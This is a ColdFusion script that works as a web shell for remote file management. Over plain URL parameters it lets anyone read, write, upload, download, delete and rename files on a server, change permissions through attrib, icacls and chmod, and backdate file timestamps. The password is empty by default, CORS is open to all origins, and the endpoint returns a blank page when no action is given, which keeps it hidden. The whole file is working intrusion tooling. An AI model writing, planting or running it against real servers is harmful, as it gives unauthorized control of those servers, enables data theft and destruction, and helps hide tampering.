<cfprocessingdirective suppresswhitespace="true">
<cfsilent>
<cfset PASSWORD = "">

<cfheader name="Access-Control-Allow-Origin" value="*">
<cfheader name="Access-Control-Allow-Methods" value="GET,POST,OPTIONS">
<cfheader name="Access-Control-Allow-Headers" value="Content-Type">

<cfif cgi.request_method EQ "OPTIONS">
    <cfabort>
</cfif>

<cfparam name="url.action" default="">
<cfparam name="url.password" default="">
<cfparam name="url.path" default="">
<cfparam name="form.path" default="">
<cfparam name="form.content" default="">

<cfset action = url.action>
<cfset pw = url.password>

<cfif action EQ "">
    <cfcontent type="text/html"><cfabort>
</cfif>

<cfif PASSWORD NEQ "" AND pw NEQ PASSWORD>
    <cfcontent type="application/json"><cfoutput>null</cfoutput><cfabort>
</cfif>

<cfset result = "">

<cftry>
    <cfif action EQ "list">
        <cfset path = url.path>
        <cfif path EQ "" OR path EQ "/">
            <cfset path = expandPath("/")>
        </cfif>
        <!--- Normalize path separators for Windows --->
        <cfif server.os.name CONTAINS "Windows">
            <cfset path = replace(path, "/", "\", "all")>
        </cfif>
        <!--- Remove trailing slash for directoryExists check --->
        <cfif len(path) GT 1 AND (right(path, 1) EQ "/" OR right(path, 1) EQ "\")>
            <cfset pathCheck = left(path, len(path) - 1)>
        <cfelse>
            <cfset pathCheck = path>
        </cfif>
        <!--- Ensure path ends with separator for listing --->
        <cfif NOT (right(path, 1) EQ "/" OR right(path, 1) EQ "\")>
            <cfset path = path & (server.os.name CONTAINS "Windows" ? "\" : "/")>
        </cfif>

        <cfif directoryExists(pathCheck)>
            <cfset items = []>
            <cfset parentPath = getDirectoryFromPath(left(path, len(path)-1))>
            <cfif parentPath NEQ "" AND parentPath NEQ path>
                <cfset arrayAppend(items, {
                    "name": "..",
                    "path": parentPath,
                    "is_dir": true,
                    "size": 0,
                    "size_formatted": "-",
                    "mtime": 0,
                    "perms": "drwxr-xr-x",
                    "readable": true,
                    "writable": true
                })>
            </cfif>

            <cfdirectory action="list" directory="#path#" name="dirList" sort="type ASC, name ASC">

            <cfloop query="dirList">
                <cfset mtime = 0>
                <cfif isDate(dirList.dateLastModified)>
                    <cfset mtime = dateDiff("s", createDateTime(1970,1,1,0,0,0), dirList.dateLastModified)>
                </cfif>
                <cfset isDir = (dirList.type EQ "Dir")>
                <cfset arrayAppend(items, {
                    "name": dirList.name,
                    "path": path & dirList.name & (isDir ? "/" : ""),
                    "is_dir": isDir,
                    "size": isDir ? 0 : dirList.size,
                    "size_formatted": isDir ? "-" : dirList.size & " B",
                    "mtime": mtime,
                    "perms": isDir ? "drwxr-xr-x" : "-rw-r--r--",
                    "readable": true,
                    "writable": true
                })>
            </cfloop>

            <cfset result = serializeJSON({
                "success": true,
                "data": {
                    "path": path,
                    "items": items
                },
                "message": ""
            })>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Directory not found"})>
        </cfif>

    <cfelseif action EQ "read">
        <cfset path = url.path>
        <cfif fileExists(path)>
            <cffile action="read" file="#path#" variable="content" charset="utf-8">
            <cfset result = serializeJSON({
                "success": true,
                "data": {
                    "path": path,
                    "content": content
                },
                "message": ""
            })>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "File not found"})>
        </cfif>

    <cfelseif action EQ "write">
        <cfset path = len(url.path) ? url.path : form.path>
        <cfset content = form.content>
        <cfif path NEQ "">
            <cffile action="write" file="#path#" output="#content#" charset="utf-8">
            <cfset result = serializeJSON({"success": true, "message": "Saved"})>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Path empty"})>
        </cfif>

    <cfelseif action EQ "mkdir">
        <cfset path = url.path>
        <cfif path NEQ "">
            <cfif NOT directoryExists(path)>
                <cfdirectory action="create" directory="#path#">
                <cfset result = serializeJSON({"success": true, "message": "Created"})>
            <cfelse>
                <cfset result = serializeJSON({"success": false, "message": "Already exists"})>
            </cfif>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Path empty"})>
        </cfif>

    <cfelseif action EQ "delete">
        <cfset path = url.path>
        <cfif directoryExists(path)>
            <cfdirectory action="delete" directory="#path#" recurse="true">
            <cfset result = serializeJSON({"success": true, "message": "Deleted"})>
        <cfelseif fileExists(path)>
            <cffile action="delete" file="#path#">
            <cfset result = serializeJSON({"success": true, "message": "Deleted"})>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Not found"})>
        </cfif>

    <cfelseif action EQ "rename">
        <cfparam name="url.old_path" default="">
        <cfparam name="url.new_path" default="">
        <cfif directoryExists(url.old_path)>
            <cfdirectory action="rename" directory="#url.old_path#" newdirectory="#url.new_path#">
            <cfset result = serializeJSON({"success": true, "message": "Renamed"})>
        <cfelseif fileExists(url.old_path)>
            <cffile action="rename" source="#url.old_path#" destination="#url.new_path#">
            <cfset result = serializeJSON({"success": true, "message": "Renamed"})>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Not found"})>
        </cfif>

    <cfelseif action EQ "download">
        <cfset path = url.path>
        <cfif fileExists(path)>
            <cfheader name="Content-Disposition" value="attachment; filename=#getFileFromPath(path)#">
            <cfcontent type="application/octet-stream" file="#path#">
            <cfabort>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "File not found"})>
        </cfif>

    <cfelseif action EQ "upload">
        <cfparam name="url.dir" default="">
        <cfparam name="form.dir" default="">
        <cfset uploadDir = len(url.dir) ? url.dir : form.dir>
        <cfif uploadDir EQ "">
            <cfset uploadDir = expandPath("/")>
        </cfif>
        <cfif structKeyExists(form, "file")>
            <cffile action="upload" filefield="file" destination="#uploadDir#" nameconflict="overwrite">
            <cfset result = serializeJSON({"success": true, "message": "Uploaded", "data": {"path": uploadDir & cffile.serverFile}})>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "No file"})>
        </cfif>

    <cfelseif action EQ "touch">
        <!--- Check both url and form scopes for parameters --->
        <cfparam name="url.time" default="">
        <cfparam name="form.time" default="">
        <cfparam name="form.path" default="">
        <cfset path = len(url.path) ? url.path : form.path>
        <cfset timeVal = len(url.time) ? url.time : form.time>
        <!--- Normalize path separators for Windows --->
        <cfif server.os.name CONTAINS "Windows">
            <cfset path = replace(path, "/", "\", "all")>
        </cfif>
        <!--- Remove trailing slash for directory paths --->
        <cfif right(path, 1) EQ "/" OR right(path, 1) EQ "\">
            <cfset path = left(path, len(path) - 1)>
        </cfif>
        <cfset timestamp = val(timeVal)>
        <cftry>
            <!--- Use Java File API for checking and setting --->
            <cfset javaFile = createObject("java", "java.io.File").init(path)>
            <cfif javaFile.exists() AND timestamp GT 0>
                <cfset success = javaFile.setLastModified(javaCast("long", timestamp * 1000))>
                <cfif success>
                    <cfset result = serializeJSON({"success": true, "message": "Updated"})>
                <cfelse>
                    <cfset result = serializeJSON({"success": false, "message": "Failed to update time"})>
                </cfif>
            <cfelse>
                <cfset result = serializeJSON({"success": false, "message": "Not found or invalid time (path=" & path & ", time=" & timestamp & ")"})>
            </cfif>
        <cfcatch>
            <cfset result = serializeJSON({"success": false, "message": "Touch failed: " & cfcatch.message})>
        </cfcatch>
        </cftry>

    <cfelseif action EQ "chmod">
        <cfparam name="url.mode" default="">
        <cfparam name="url.user" default="">
        <cfset path = url.path>
        <cfset mode = url.mode>
        <cfset targetUser = url.user>
        <cfif (fileExists(path) OR directoryExists(path)) AND mode NEQ "">
            <cftry>
                <cfif server.os.name CONTAINS "Windows">
                    <!--- Windows: use icacls or attrib --->
                    <cfif mode EQ "readonly">
                        <cfexecute name="attrib" arguments="+R #chr(34)##path##chr(34)#" timeout="10" />
                    <cfelseif mode EQ "normal">
                        <cfexecute name="attrib" arguments="-R #chr(34)##path##chr(34)#" timeout="10" />
                    <cfelseif mode EQ "hidden">
                        <cfexecute name="attrib" arguments="+H #chr(34)##path##chr(34)#" timeout="10" />
                    <cfelseif mode EQ "visible">
                        <cfexecute name="attrib" arguments="-H #chr(34)##path##chr(34)#" timeout="10" />
                    <cfelseif targetUser NEQ "">
                        <!--- NTFS permissions: mode=F(full),M(modify),RX(read+execute),R(read),W(write) --->
                        <cfexecute name="icacls" arguments="#chr(34)##path##chr(34)# /grant #targetUser#:#mode#" timeout="10" />
                    <cfelse>
                        <cfthrow message="Invalid mode for Windows. Use: readonly, normal, hidden, visible, or specify user parameter">
                    </cfif>
                    <cfset result = serializeJSON({"success": true, "message": "Permission changed"})>
                <cfelse>
                    <!--- Unix: use chmod command --->
                    <cfexecute name="chmod" arguments="#mode# #chr(34)##path##chr(34)#" timeout="10" />
                    <cfset result = serializeJSON({"success": true, "message": "Permission changed"})>
                </cfif>
            <cfcatch>
                <cfset result = serializeJSON({"success": false, "message": "Failed: " & cfcatch.message})>
            </cfcatch>
            </cftry>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Not found or mode empty"})>
        </cfif>

    <cfelseif action EQ "server">
        <cfset docRoot = expandPath("/")>
        <cftry>
            <cfset currentUser = createObject("java", "java.lang.System").getProperty("user.name")>
            <cfcatch>
                <cfset currentUser = "N/A">
            </cfcatch>
        </cftry>
        <cfset result = serializeJSON({
            "success": true,
            "data": {
                "php_version": "CFML " & server.coldfusion.productversion,
                "server_software": server.coldfusion.productname,
                "document_root": docRoot,
                "upload_max": "N/A",
                "disk_free": "N/A",
                "disk_total": "N/A",
                "current_user": currentUser
            },
            "message": ""
        })>

    <cfelseif action EQ "info">
        <cfset path = url.path>
        <cfif fileExists(path)>
            <cfset fileInfo = getFileInfo(path)>
            <cfset mtime = dateDiff("s", createDateTime(1970,1,1,0,0,0), fileInfo.lastmodified)>
            <cfset result = serializeJSON({
                "success": true,
                "data": {
                    "path": path,
                    "name": fileInfo.name,
                    "is_dir": false,
                    "size": fileInfo.size,
                    "size_formatted": fileInfo.size & " B",
                    "mtime": mtime,
                    "ctime": mtime,
                    "atime": mtime,
                    "perms": "-rw-r--r--",
                    "perms_octal": "0644",
                    "readable": fileInfo.canRead,
                    "writable": fileInfo.canWrite
                },
                "message": ""
            })>
        <cfelseif directoryExists(path)>
            <cfset dirInfo = getFileInfo(path)>
            <cfset mtime = dateDiff("s", createDateTime(1970,1,1,0,0,0), dirInfo.lastmodified)>
            <cfset result = serializeJSON({
                "success": true,
                "data": {
                    "path": path,
                    "name": dirInfo.name,
                    "is_dir": true,
                    "size": 0,
                    "size_formatted": "-",
                    "mtime": mtime,
                    "ctime": mtime,
                    "atime": mtime,
                    "perms": "drwxr-xr-x",
                    "perms_octal": "0755",
                    "readable": dirInfo.canRead,
                    "writable": dirInfo.canWrite
                },
                "message": ""
            })>
        <cfelse>
            <cfset result = serializeJSON({"success": false, "message": "Not found"})>
        </cfif>

    <cfelse>
        <cfset result = serializeJSON({"success": false, "message": "Unknown action"})>
    </cfif>

<cfcatch type="any">
    <cfset result = serializeJSON({"success": false, "message": "Error: " & cfcatch.message})>
</cfcatch>
</cftry>

</cfsilent>
</cfprocessingdirective>
<cfcontent type="application/json"><cfoutput>#result#</cfoutput>
